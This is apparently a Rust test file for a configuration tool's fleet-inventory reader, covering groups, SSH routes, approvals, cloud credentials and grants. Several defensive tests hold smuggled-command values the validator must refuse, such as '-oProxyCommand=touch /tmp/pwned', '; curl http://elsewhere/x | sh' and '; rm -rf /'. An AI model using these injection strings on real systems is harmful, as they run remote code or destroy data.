//! Which machines there are, and what is written down about them.
//!
//! A hundred machines cannot be a hundred declarations, and the reason a group
//! may be iterated where a fact may not is that the fleet is settled before the
//! program runs. See decision 0025.

// Tests are allowed to be blunt. See docs/CODING_STANDARDS.md.
#![allow(clippy::unwrap_used, clippy::indexing_slicing, clippy::panic)]

use nerpa_config::evaluate;
use nerpa_config::fleet::Fleet;
use nerpa_config::template::Held;
use nerpa_core::Attribute;
use nerpa_core::address::address;

const FLEET: &str = r#"
[groups.web]
workers = 4
port = 443

[groups.production]
retention = 30

[nodes.web-01]
groups = ["web", "production"]

[nodes.web-02]
groups = ["web", "production"]
values = { workers = 16 }

[nodes.db-01]
groups = ["production"]
"#;

fn fleet() -> Fleet {
    Fleet::read(FLEET).expect("a fleet")
}

fn graph_of(source: &str) -> nerpa_core::Graph {
    evaluate("main.star", source, Box::new(Held::new()), fleet()).expect("it should evaluate")
}

/// The whole point: one declaration, every machine in the group.
#[test]
#[dacc_derive::doc_anchor(
    id = "a-group-is-iterated-and-a-hundred-machines-are-not-a-hundred-declarations"
)]
fn a_group_is_iterated_and_a_hundred_machines_are_not_a_hundred_declarations() {
    let graph = graph_of(
        r#"
for host in group("web"):
    resource("os:file.conf@%s" % host, {"workers": host["workers"]})
"#,
    );

    assert_eq!(graph.len(), 2, "one resource per machine in the group");
    for (node, workers) in [("web-01", 4), ("web-02", 16)] {
        let found = graph
            .get(&address(&format!("os:file.conf@{node}")))
            .and_then(|resource| resource.attribute("workers"))
            .and_then(Attribute::known)
            .expect("a value");
        assert_eq!(found, &nerpa_core::Value::Integer(workers));
    }
}

/// A node saying what it is is a statement, not a rank in a table of twenty-two
/// levels nobody can remember.
#[test]
#[dacc_derive::doc_anchor(id = "a-node-may-say-what-its-groups-do-not")]
fn a_node_may_say_what_its_groups_do_not() {
    let graph = graph_of(
        r#"
for host in group("production"):
    resource("os:file.conf@%s" % host, {"retention": host["retention"]})
"#,
    );
    assert_eq!(graph.len(), 3, "web-01, web-02 and db-01");
}

/// Ansible answers "where did this value come from" with a precedence table.
/// Here the question has one answer per value, and a collision is something
/// somebody decides rather than something a rule decides for them.
#[test]
#[dacc_derive::doc_anchor(id = "two-groups-giving-one-node-the-same-key-is-an-error-naming-both")]
fn two_groups_giving_one_node_the_same_key_is_an_error_naming_both() {
    let refusal = Fleet::read(
        r#"
[groups.web]
workers = 4

[groups.production]
workers = 8

[nodes.web-01]
groups = ["web", "production"]
"#,
    )
    .expect_err("a precedence rule is not the answer");

    assert!(refusal.contains("web-01"), "{refusal}");
    assert!(refusal.contains("\"web\""), "{refusal}");
    assert!(refusal.contains("\"production\""), "{refusal}");
    assert!(refusal.contains("workers"), "{refusal}");
}

#[test]
#[dacc_derive::doc_anchor(
    id = "a-value-the-fleet-does-not-give-is-a-refusal-rather-than-a-default"
)]
fn a_value_the_fleet_does_not_give_is_a_refusal_rather_than_a_default() {
    let refusal = evaluate(
        "main.star",
        r#"
for host in group("web"):
    resource("os:file.conf@%s" % host, {"nothing": host["nowhere"]})
"#,
        Box::new(Held::new()),
        fleet(),
    )
    .expect_err("an absent value is not an empty one");
    assert!(refusal.to_string().contains("nowhere"), "{refusal}");
}

#[test]
fn a_group_nothing_describes_is_a_refusal_rather_than_an_empty_run() {
    let refusal = evaluate(
        "main.star",
        r#"
for host in group("nonesuch"):
    resource("os:file.conf@%s" % host, {})
"#,
        Box::new(Held::new()),
        fleet(),
    )
    .expect_err("a group that is not there is a mistake, not nothing to do");
    assert!(refusal.to_string().contains("nonesuch"), "{refusal}");
}

/// Only what a run touches, because a document describing two hundred machines
/// should not make a run that touches three open two hundred connections.
#[test]
#[dacc_derive::doc_anchor(id = "only-the-machines-a-run-reaches-for-join-its-inventory")]
fn only_the_machines_a_run_reaches_for_join_its_inventory() {
    let graph = graph_of(
        r#"
for host in group("web"):
    resource("os:file.conf@%s" % host, {})
"#,
    );
    let known: Vec<&str> = graph
        .inventory()
        .nodes()
        .map(nerpa_core::Target::as_str)
        .collect();
    assert_eq!(known, vec!["web-01", "web-02"], "db-01 was never asked for");
}

/// A fleet is data by the time the program sees it, so it may be compared and
/// branched on — which is exactly what a fact may not do.
#[test]
#[dacc_derive::doc_anchor(id = "what-the-fleet-says-may-decide-which-resources-exist")]
fn what_the_fleet_says_may_decide_which_resources_exist() {
    let graph = graph_of(
        r#"
for host in group("web"):
    if host["workers"] > 8:
        resource("os:file.big@%s" % host, {})
"#,
    );
    assert_eq!(graph.len(), 1, "only web-02 has sixteen");
    assert!(graph.get(&address("os:file.big@web-02")).is_some());
}

/// How a machine is reached is a property of the node, not of the protocol.
/// Escalation is an argument and appears nowhere on the wire — decision 0035.
#[test]
fn a_node_says_how_it_is_reached_and_what_it_runs_under() {
    use nerpa_config::fleet::Route;

    let fleet = Fleet::read(
        r#"
[groups.test]
kept = 1

[nodes.here]
groups = ["test"]

[nodes.plain]
groups = ["test"]
ssh = "192.0.2.34"

[nodes.privileged]
groups = ["test"]
ssh = "web-01"
executor = "/opt/nerpa/nerpa-executor"
become = "sudo -n"

[nodes.proxied]
groups = ["test"]
ssh = "nerpa@web-02.example.internal"
ssh_config = "/home/somebody/.tbot/nerpa/ssh_config"
"#,
    )
    .expect("a fleet");

    let node = |name: &str| nerpa_core::Target::new(name).expect("a node name");

    assert_eq!(
        fleet.route(&node("here")),
        Route::Here,
        "a machine the document says nothing about is this one"
    );
    assert_eq!(
        fleet.route(&node("plain")),
        Route::Ssh {
            host: "192.0.2.34".to_owned(),
            config: None,
            executor: None,
            escalate: Vec::new(),
        },
        "and one that names no executor gets one put there"
    );
    assert_eq!(
        fleet.route(&node("privileged")),
        Route::Ssh {
            host: "web-01".to_owned(),
            config: None,
            executor: Some("/opt/nerpa/nerpa-executor".to_owned()),
            escalate: vec!["sudo".to_owned(), "-n".to_owned()],
        },
        "escalation is words, because a shell string is where somebody else's \
         quoting becomes somebody else's command"
    );
    assert_eq!(
        fleet.route(&node("proxied")),
        Route::Ssh {
            host: "nerpa@web-02.example.internal".to_owned(),
            config: Some("/home/somebody/.tbot/nerpa/ssh_config".to_owned()),
            executor: None,
            escalate: Vec::new(),
        },
        "a machine behind an identity-aware proxy names the generated \
         configuration and needs nothing else: it is a route, not a transport"
    );
}

/// `ssh` hands its host to the local `ssh` binary as a positional argument, and
/// `ssh` reads a leading `-` as another option — `-oProxyCommand=…` runs a
/// command **here**, before any machine is contacted. A fleet is a document
/// that gets swapped, shared and one day generated from a cloud inventory, so a
/// name out of one must not be able to reach the control machine.
#[test]
fn a_host_that_would_be_read_as_an_option_is_refused() {
    let refusal = Fleet::read(
        r#"
[nodes.web-01]
ssh = "-oProxyCommand=touch /tmp/pwned"
"#,
    )
    .expect_err("a host cannot begin with a dash");
    assert!(
        refusal.contains("web-01") && refusal.contains("option"),
        "the refusal should name the node and what would happen: {refusal}"
    );
}

/// `ssh` joins whatever trails the host into one string and hands it to a shell
/// on the far side. An executor "path" holding a `;` is two commands there.
#[test]
fn an_executor_that_is_not_a_path_is_refused() {
    let refusal = Fleet::read(
        r#"
[nodes.web-01]
ssh = "web-01"
executor = "/bin/true; curl http://elsewhere/x | sh"
"#,
    )
    .expect_err("that is not a path");
    assert!(
        refusal.contains("executor"),
        "the refusal should name the field: {refusal}"
    );
}

/// A remote shell resolves anything but an absolute path from where the
/// connection starts, which is the connecting user's home, and `~` is that home
/// by name. With `become`, a binary that user can write is root for them, which is
/// what 0039 refuses; the characters alone let all three of these through.
#[test]
fn an_executor_that_is_not_an_absolute_path_is_refused() {
    for path in [
        "~/nerpa-executor",
        "bin/nerpa-executor",
        "/usr/local/sbin/../../home/nerpa/nerpa-executor",
    ] {
        let refusal = Fleet::read(&format!(
            r#"
[nodes.web-01]
ssh = "nerpa@web-01"
executor = "{path}"
become = "sudo -n"
"#
        ))
        .expect_err(path);
        assert!(
            refusal.contains("executor") && refusal.contains("absolute"),
            "the refusal should name the field and why: {refusal}"
        );
    }
}

#[test]
fn an_escalation_that_is_not_a_command_is_refused() {
    let refusal = Fleet::read(
        r#"
[nodes.web-01]
ssh = "web-01"
become = "sudo -n; rm -rf /"
"#,
    )
    .expect_err("that is not an escalation");
    assert!(
        refusal.contains("become"),
        "the refusal should name the field: {refusal}"
    );
}

/// And the ordinary shapes still read: a host, an alias, an address, a user at
/// a host, a path, and an escalation of several words.
#[test]
fn the_shapes_people_actually_write_still_read() {
    let fleet = Fleet::read(
        r#"
[nodes.by-alias]
ssh = "web-01"

[nodes.by-name]
ssh = "web-01.example.internal"

[nodes.by-address]
ssh = "192.0.2.34"

[nodes.as-somebody]
ssh = "nerpa@web-01.example.internal"
executor = "/opt/nerpa/nerpa-executor"
become = "sudo -n"
"#,
    )
    .expect("nothing here is a way to run a command");
    assert_eq!(fleet.len(), 4);
}

/// An executor the connecting user can write is an executor that user can run
/// as root, so `NOPASSWD` on a delivered one is full root wearing a narrow
/// rule. The two are refused together, and the refusal names the way out: an
/// executor root put somewhere that user cannot write.
#[test]
fn escalating_to_an_executor_nerpa_delivers_is_refused() {
    let refusal = Fleet::read(
        r#"
[nodes.web-01]
ssh = "web-01"
become = "sudo -n"
"#,
    )
    .expect_err("that combination is root in disguise");
    assert!(
        refusal.contains("executor") && refusal.contains("become"),
        "the refusal should name both halves and the way out: {refusal}"
    );
}

/// Either alone is fine. Delivering to run unprivileged is the ordinary case,
/// and naming an installed executor without escalating is somebody who put it
/// somewhere of their own.
#[test]
fn delivering_without_escalating_and_escalating_to_an_installed_one_both_read() {
    let fleet = Fleet::read(
        r#"
[nodes.delivered]
ssh = "web-01"

[nodes.installed]
ssh = "web-02"
executor = "/usr/local/sbin/nerpa-executor"
become = "sudo -n"

[nodes.named-only]
ssh = "web-03"
executor = "/opt/nerpa/nerpa-executor"
"#,
    )
    .expect("none of these is the trap");
    assert_eq!(fleet.len(), 3);
}

/// `INV-TRUST-001` names its bypass: a static key reaching the transport
/// through the fleet document. A node's fields are a closed set, the key
/// belongs to `ssh`, and a document that names one is refused by name rather
/// than quietly ignored.
#[test]
#[dacc_derive::doc_anchor(id = "a-fleet-that-names-a-key-is-refused-naming-it")]
fn a_fleet_that_names_a_key_is_refused_naming_it() {
    let refused = Fleet::read(
        r#"
[nodes.web-01]
ssh = "web-01"
key = "/home/somebody/.ssh/id_ed25519"
"#,
    )
    .unwrap_err();
    assert!(refused.contains("\"key\""), "{refused}");
    assert!(refused.contains("belong to `ssh`"), "{refused}");
}

/// Where a deployment keeps the two duties apart, the fleet names the
/// approvers (`0009`). One that names none asks for no signature.
#[test]
fn a_fleet_says_who_may_sign_a_plan() {
    let named = Fleet::read(
        r#"
[approval]
approvers = "/etc/nerpa/approvers"

[nodes.web-01]
"#,
    )
    .expect("a fleet");
    assert_eq!(named.approvers(), Some("/etc/nerpa/approvers"));

    assert_eq!(
        fleet().approvers(),
        None,
        "and one that names none says none"
    );
}

/// The approval table is a closed set, like a node's fields: a field silently
/// ignored would leave a document that says something no run does.
#[test]
fn an_approval_field_nobody_knows_is_refused_naming_it() {
    let refused = Fleet::read(
        r#"
[approval]
signers = "/etc/nerpa/approvers"
"#,
    )
    .unwrap_err();
    assert!(refused.contains("\"signers\""), "{refused}");
}

/// An approval table that says nobody may sign says nothing at all: naming the
/// table without the approvers is refused rather than read as no policy.
#[test]
fn an_approval_table_that_nobody_may_sign_under_is_refused() {
    let refused = Fleet::read("[approval]\n").unwrap_err();
    assert!(refused.contains("approvers"), "{refused}");
}

/// The cloud a run touches names its folder; the credential is the static token
/// when the fleet carries one, and the yc profile when it does not
/// (adr-2026-071).
#[test]
fn a_cloud_reads_with_or_without_a_static_token() {
    let with_token = Fleet::read(
        r#"
[cloud.yandex]
folder_id = "b1g"
iam_token = "t1"
"#,
    )
    .expect("a fleet");
    let cloud = with_token.cloud().expect("a cloud");
    assert_eq!(cloud.folder_id, "b1g");
    assert_eq!(cloud.iam_token.as_deref(), Some("t1"));

    let without_token = Fleet::read(
        r#"
[cloud.yandex]
folder_id = "b1g"
"#,
    )
    .expect("a fleet");
    let cloud = without_token.cloud().expect("a cloud");
    assert_eq!(cloud.folder_id, "b1g");
    assert_eq!(cloud.iam_token, None);
}

/// A credential that is not text is refused rather than read as something it is
/// not.
#[test]
fn a_cloud_token_that_is_not_text_is_refused() {
    let refused = Fleet::read(
        r#"
[cloud.yandex]
folder_id = "b1g"
iam_token = 123
"#,
    )
    .unwrap_err();
    assert!(refused.contains("iam_token"), "{refused}");
}

/// A run proves who it is with a service-account key by naming the file it is
/// in, and the file is all the fleet document says about the key
/// (adr-2026-079).
#[test]
fn a_cloud_names_a_service_account_key_file() {
    let fleet = Fleet::read(
        r#"
[cloud.yandex]
folder_id = "b1g"
key_file = "/etc/nerpa/key.json"
"#,
    )
    .expect("a fleet");
    let cloud = fleet.cloud().expect("a cloud");
    assert_eq!(cloud.key_file.as_deref(), Some("/etc/nerpa/key.json"));
    assert_eq!(cloud.iam_token, None);
}

/// A long-lived credential in the fleet document is refused by name, in any
/// spelling of the name, and the refusal does not repeat the value.
#[test]
fn a_long_lived_credential_in_the_fleet_document_is_refused_by_name() {
    for (field, value) in [
        ("api_key", "AQVN-api-value"),
        ("API_KEY", "AQVN-upper-value"),
        ("apiKey", "AQVN-camel-value"),
        ("secret", "AQVN-secret-value"),
        ("static_token", "static-value"),
        ("oauth_token", "y0_oauth-value"),
        ("token", "t1.token-value"),
    ] {
        let refused = Fleet::read(&format!(
            "[cloud.yandex]\nfolder_id = \"b1g\"\n{field} = \"{value}\"\n"
        ))
        .unwrap_err();
        assert!(refused.contains(field), "{field}: {refused}");
        assert!(
            refused.contains("long-lived"),
            "the refusal says what the field is: {refused}"
        );
        assert!(
            refused.contains("key_file"),
            "the refusal says what to write instead: {refused}"
        );
        assert!(
            !refused.contains(value),
            "the refusal does not repeat the credential: {refused}"
        );
    }
}

/// A key does not belong in the fleet document at all: the file it is in does.
#[test]
fn a_key_in_the_fleet_document_is_refused_and_the_file_is_asked_for() {
    for field in ["private_key", "service_account_key"] {
        let refused = Fleet::read(&format!(
            "[cloud.yandex]\nfolder_id = \"b1g\"\n{field} = \"-----BEGIN PRIVATE KEY-----\"\n"
        ))
        .unwrap_err();
        assert!(refused.contains(field), "{refused}");
        assert!(refused.contains("key_file"), "{refused}");
        assert!(!refused.contains("BEGIN PRIVATE KEY"), "{refused}");
    }
}

/// One credential at a time: a fleet that names a token and a key file says two
/// things about who is running.
#[test]
fn a_cloud_that_names_a_token_and_a_key_file_is_refused() {
    let refused = Fleet::read(
        r#"
[cloud.yandex]
folder_id = "b1g"
iam_token = "t1"
key_file = "/etc/nerpa/key.json"
"#,
    )
    .unwrap_err();
    assert!(refused.contains("one credential"), "{refused}");
}

/// A key file that names nothing is not a key file.
#[test]
fn a_key_file_that_is_not_a_path_is_refused() {
    for line in ["key_file = 3", "key_file = \"\""] {
        let refused =
            Fleet::read(&format!("[cloud.yandex]\nfolder_id = \"b1g\"\n{line}\n")).unwrap_err();
        assert!(refused.contains("key_file"), "{line}: {refused}");
    }
}

/// The fleet is printed in errors and in debugging, and a token in it must not
/// come out (adr-2026-079).
#[test]
fn no_debug_output_of_the_fleet_prints_a_token() {
    let fleet = Fleet::read(
        r#"
[cloud.yandex]
folder_id = "b1g"
iam_token = "t1.secret-token-text"
"#,
    )
    .expect("a fleet");
    let printed = format!("{fleet:?} {:?}", fleet.cloud());
    assert!(!printed.contains("secret-token-text"), "{printed}");
    assert!(
        printed.contains("b1g"),
        "the folder is still said: {printed}"
    );
}

/// The fleet is a closed set. A fleet that names no approvers asks for no
/// signature, so a table skipped because its name is misspelt would turn the
/// requirement off and say nothing.
#[test]
fn an_unknown_table_in_the_fleet_is_refused_by_name() {
    for (document, name) in [
        (
            "[aproval]\napprovers = \"/etc/nerpa/approvers\"\n",
            "aproval",
        ),
        (
            "[approvals]\napprovers = \"/etc/nerpa/approvers\"\n",
            "approvals",
        ),
        ("[grant]\nweb-ops = \"kind=instance\"\n", "grant"),
        ("[node.web-01]\nssh = \"web-01\"\n", "node"),
        ("[clouds.yandex]\nfolder_id = \"b1g\"\n", "clouds"),
    ] {
        let refused = Fleet::read(document).unwrap_err();
        assert!(refused.contains(name), "{name}: {refused}");
        assert!(
            refused.contains("approval") && refused.contains("nodes"),
            "the refusal names the tables it does read: {refused}"
        );
    }
}

/// A known table written as something that is not a table is refused too: the
/// signature requirement is no less off for being written `approval = "..."`.
#[test]
fn a_known_table_written_as_something_else_is_refused() {
    for (document, name) in [
        ("approval = \"/etc/nerpa/approvers\"\n", "approval"),
        ("nodes = 3\n", "nodes"),
        ("groups = [\"web\"]\n", "groups"),
        ("grants = \"kind=instance\"\n", "grants"),
        ("cloud = \"yandex\"\n", "cloud"),
    ] {
        let refused = Fleet::read(document).unwrap_err();
        assert!(refused.contains(name), "{name}: {refused}");
        assert!(refused.contains("table"), "{name}: {refused}");
    }
}

/// A cloud the build has no provider for is named, with the clouds it has,
/// instead of being skipped as if the document did not say it.
#[test]
fn a_cloud_without_a_provider_is_named_and_not_skipped() {
    let refused = Fleet::read("[cloud.alibaba]\nregion = \"ap-southeast-1\"\n").unwrap_err();
    assert!(refused.contains("cloud.alibaba"), "{refused}");
    assert!(
        refused.contains("yandex"),
        "the refusal names the clouds the build has: {refused}"
    );

    let refused = Fleet::read("[cloud]\nyandex = \"b1g\"\n").unwrap_err();
    assert!(refused.contains("cloud.yandex"), "{refused}");
    assert!(refused.contains("table"), "{refused}");
}

/// Everything the fleet does read still reads: the closed set is not a narrower
/// one.
#[test]
fn a_fleet_with_every_table_it_reads_still_reads() {
    let fleet = Fleet::read(
        r#"
[groups.web]
port = 443

[nodes.web-01]
groups = ["web"]

[approval]
approvers = "/etc/nerpa/approvers"

[grants]
web-ops = "kind=instance;target=web-01;op=create"

[cloud.yandex]
folder_id = "b1g"
"#,
    )
    .expect("a fleet that uses every table it reads");
    assert!(fleet.cloud().is_some());
    assert!(fleet.grant("web-ops").is_some());
}

/// The fleet names the grant it issued an identity, and the run reads it back
/// as the structured grant that limits it (`0072`).
#[test]
fn the_fleet_names_the_grant_it_issued() {
    let fleet = Fleet::read(
        r#"
[grants]
web-ops = "kind=instance;target=web-01,web-02;op=create,update,delete"
"#,
    )
    .expect("a fleet");

    let grant = fleet.grant("web-ops").expect("an issued grant");
    assert!(grant.allows(
        &address("yandex:instance.db@web-01"),
        nerpa_core::ChangeKind::Create
    ));
    assert!(!grant.allows(
        &address("yandex:instance.db@web-03"),
        nerpa_core::ChangeKind::Create
    ));
    assert!(!grant.allows(
        &address("yandex:instance.db@web-01"),
        nerpa_core::ChangeKind::Replace
    ));
    assert_eq!(fleet.grant("nobody"), None);
}

/// A grant that does not parse is refused where the fleet is read, naming the
/// identity it was written under.
#[test]
fn a_grant_that_does_not_parse_is_refused() {
    let refused = Fleet::read(
        r#"
[grants]
web-ops = "kind=instance;bogus=value"
"#,
    )
    .unwrap_err();
    assert!(refused.contains("web-ops"), "{refused}");
    assert!(refused.contains("bogus"), "{refused}");
}

/// A grant written as a table is refused rather than read as a string it is
/// not.
#[test]
fn a_grant_that_is_not_a_string_is_refused() {
    let refused = Fleet::read(
        r#"
[grants.web-ops]
kind = "instance"
"#,
    )
    .unwrap_err();
    assert!(refused.contains("web-ops"), "{refused}");
}
